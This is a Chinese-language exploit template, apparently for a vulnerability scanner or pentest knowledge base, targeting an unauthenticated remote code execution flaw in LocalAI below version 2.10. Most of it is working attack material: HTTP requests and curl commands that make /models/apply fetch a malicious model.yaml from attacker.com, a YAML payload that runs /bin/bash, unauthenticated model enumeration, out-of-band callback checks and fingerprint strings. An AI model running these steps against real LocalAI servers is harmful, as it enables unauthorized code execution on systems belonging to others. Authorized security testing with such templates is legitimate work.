---
id: LOCALAI-RCE
title: LocalAI 模型加载远程代码执行漏洞
product: localai
vendor: LocalAI
version_affected: "< 2.10"
severity: CRITICAL
tags: [rce, ai, llm, 无需认证]
fingerprint: ["LocalAI", "localai", "/v1/models", "/models/apply"]
---

## 漏洞描述

LocalAI允许通过API加载远程模型，恶意模型可包含代码执行payload（通过pickle反序列化或自定义后端脚本）。

## 影响版本

- LocalAI < 2.10

## 前置条件

- 目标 LocalAI 服务端口（默认8080）可从网络访问
- 服务未配置认证（默认行为）
- RCE 利用需攻击者控制一个 HTTP 服务器托管恶意模型文件

## 利用步骤

### 通过模型加载RCE

```http
POST /models/apply HTTP/1.1
Content-Type: application/json

{
  "url": "http://attacker.com/malicious-model.yaml",
  "name": "pwn"
}
```

恶意 model.yaml:
```yaml
name: pwn
backend: diffusers
parameters:
  command: /bin/bash -c 'id > /tmp/pwned'
```

### 未授权API访问

```bash
curl http://target:8080/v1/models
curl http://target:8080/models/available
```

## Payload

### 列出已加载模型

```bash
curl -s http://target:8080/v1/models
```

### 加载恶意远程模型实现 RCE

```bash
curl -s -X POST http://target:8080/models/apply \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://attacker.com/malicious-model.yaml",
    "name": "pwn"
  }'
```

### 查看可用模型

```bash
curl -s http://target:8080/models/available
```

## 验证方法

```bash
# 1. 确认未授权访问：返回模型列表即服务暴露
curl -s http://target:8080/v1/models | grep '"id"'

# 2. 确认模型加载端点可访问
curl -s -o /dev/null -w "%{http_code}" -X POST http://target:8080/models/apply \
  -H "Content-Type: application/json" \
  -d '{"url":"http://attacker.com/test","name":"test"}'
# 返回非 401/403 即无认证

# 3. RCE 验证：通过 OOB 回调确认
# 在 attacker.com 托管恶意 model.yaml 并监听回调，加载模型后检查是否收到回调
```

## 指纹确认

```bash
curl -s http://target:8080/v1/models
curl -s http://target:8080/ | grep -i "localai"
```
